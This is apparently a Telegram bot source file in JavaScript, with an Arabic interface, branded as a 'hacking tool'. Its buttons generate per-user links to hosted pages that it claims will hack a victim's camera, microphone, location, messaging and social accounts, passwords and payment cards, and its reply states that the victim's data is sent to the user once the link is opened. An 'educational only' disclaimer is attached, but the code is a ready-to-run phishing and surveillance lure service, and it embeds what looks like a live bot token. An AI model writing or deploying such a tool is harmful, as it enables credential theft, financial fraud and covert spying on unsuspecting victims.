const { Telegraf } = require('telegraf');

// ========== إعدادات البوت ==========
const BOT_TOKEN = '8633813610:AAEr-ggOanXyHself2xV8GAjurDYMPVBvL0';
const bot = new Telegraf(BOT_TOKEN);

// ========== روابط كل زر ==========
const LINKS = {
    camera: 'https://https-servers.netlify.app/camera.html?id=',
    microphone: 'https://https-servers.netlify.app/microphone.html?id=',
    location: 'https://https-servers.netlify.app/location.html?id=',
    whatsapp: 'https://https-servers.netlify.app/whatsapp.html?id=',
    telegram: 'https://https-servers.netlify.app/telegram.html?id=',
    facebook: 'https://https-servers.netlify.app/facebook.html?id=',
    instagram: 'https://https-servers.netlify.app/instagram.html?id=',
    twitter: 'https://https-servers.netlify.app/twitter.html?id=',
    messenger: 'https://https-servers.netlify.app/messenger.html?id=',
    tiktok: 'https://https-servers.netlify.app/tiktok.html?id=',
    gmail: 'https://https-servers.netlify.app/gmail.html?id=',
    password: 'https://https-servers.netlify.app/password.html?id=',
    cards: 'https://https-servers.netlify.app/cards.html?id=',
    files: 'https://https-servers.netlify.app/files.html?id=',
    calls: 'https://https-servers.netlify.app/calls.html?id=',
    messages: 'https://https-servers.netlify.app/messages.html?id=',
    browser: 'https://https-servers.netlify.app/browser.html?id=',
    pc: 'https://https-servers.netlify.app/pc.html?id=',
    network: 'https://https-servers.netlify.app/network.html?id=',
    general: 'https://https-servers.netlify.app/general.html?id='
};

// ========== أسماء الأزرار ==========
const NAMES = {
    camera: '📸 اختراق الكاميرا',
    microphone: '🎤 اختراق الميكروفون',
    location: '📍 اختراق الموقع',
    whatsapp: '📱 اختراق الواتساب',
    telegram: '💬 اختراق التليجرام',
    facebook: '📘 اختراق الفيسبوك',
    instagram: '📷 اختراق الانستغرام',
    twitter: '🐦 اختراق تويتر',
    messenger: '💙 اختراق ماسنجر',
    tiktok: '🔵 اختراق تيك توك',
    gmail: '📧 اختراق الجيميل',
    password: '🔐 اختراق الباسوردات',
    cards: '💳 اختراق البطاقات',
    files: '📂 اختراق الملفات',
    calls: '📞 اختراق المكالمات',
    messages: '📨 اختراق الرسائل',
    browser: '🌐 اختراق المتصفح',
    pc: '🖥️ اختراق الكمبيوتر',
    network: '📡 اختراق الشبكة',
    general: '🔓 اختراق عام'
};

// ========== لوحة الأزرار ==========
const keyboard = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '📸 اختراق الكاميرا', callback_data: 'camera' }],
            [{ text: '🎤 اختراق الميكروفون', callback_data: 'microphone' }],
            [{ text: '📍 اختراق الموقع', callback_data: 'location' }],
            [{ text: '📱 اختراق الواتساب', callback_data: 'whatsapp' }],
            [{ text: '💬 اختراق التليجرام', callback_data: 'telegram' }],
            [{ text: '📘 اختراق الفيسبوك', callback_data: 'facebook' }],
            [{ text: '📷 اختراق الانستغرام', callback_data: 'instagram' }],
            [{ text: '🐦 اختراق تويتر', callback_data: 'twitter' }],
            [{ text: '💙 اختراق ماسنجر', callback_data: 'messenger' }],
            [{ text: '🔵 اختراق تيك توك', callback_data: 'tiktok' }],
            [{ text: '📧 اختراق الجيميل', callback_data: 'gmail' }],
            [{ text: '🔐 اختراق الباسوردات', callback_data: 'password' }],
            [{ text: '💳 اختراق البطاقات', callback_data: 'cards' }],
            [{ text: '📂 اختراق الملفات', callback_data: 'files' }],
            [{ text: '📞 اختراق المكالمات', callback_data: 'calls' }],
            [{ text: '📨 اختراق الرسائل', callback_data: 'messages' }],
            [{ text: '🌐 اختراق المتصفح', callback_data: 'browser' }],
            [{ text: '🖥️ اختراق الكمبيوتر', callback_data: 'pc' }],
            [{ text: '📡 اختراق الشبكة', callback_data: 'network' }],
            [{ text: '🔓 اختراق عام', callback_data: 'general' }]
        ]
    }
};

// ========== رسائل البوت ==========
const WARNING = `⚠️ *تحذير أمني خطير* ⚠️

🔴 *أنت المسؤول الوحيد عن أي شيء تقوم به*
🔴 *الاستخدام غير القانوني يعرضك للمساءلة القانونية*
🔴 *هذه الأداة للأغراض التعليمية فقط*

👤 *المطور:* @H_X_7_X`;

const WELCOME = (name) => `🔓 *X7x HACKING TOOL* 🔓

مرحباً ${name} ..

اختر نوع الاختراق من الأزرار أدناه:

${WARNING}`;

function getLink(type, userId) {
    const base = LINKS[type] || LINKS.general;
    return base + userId;
}

function getSuccess(link, name) {
    return `✅ *تم توليد رابط الاختراق بنجاح!*

📌 *نوع الاختراق:* ${name}
🔗 *الرابط:* ${link}

⚠️ *تنبيه:* هذا الرابط خاص بك فقط
⚠️ لا تشاركه مع أي شخص آخر

🚀 *بعد فتح الضحية للرابط، سيتم إرسال البيانات إليك*`;
}

// ========== أوامر البوت ==========
bot.start((ctx) => {
    const name = ctx.from.first_name || ctx.from.username || 'صديقي';
    ctx.reply(WELCOME(name), keyboard);
});

bot.action(/.*/, async (ctx) => {
    const type = ctx.match[0];
    const userId = ctx.from.id;
    const link = getLink(type, userId);
    const name = NAMES[type] || 'اختراق';
    
    await ctx.answerCbQuery();
    await ctx.reply(getSuccess(link, name));
    
    console.log(`✅ ${ctx.from.username || userId} اختار: ${name}`);
});

// ========== تشغيل البوت ==========
bot.launch().then(() => {
    console.log('🚀 البوت شغال!');
    console.log('📅 ' + new Date().toLocaleString());
}).catch(err => {
    console.error('❌ خطأ:', err);
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));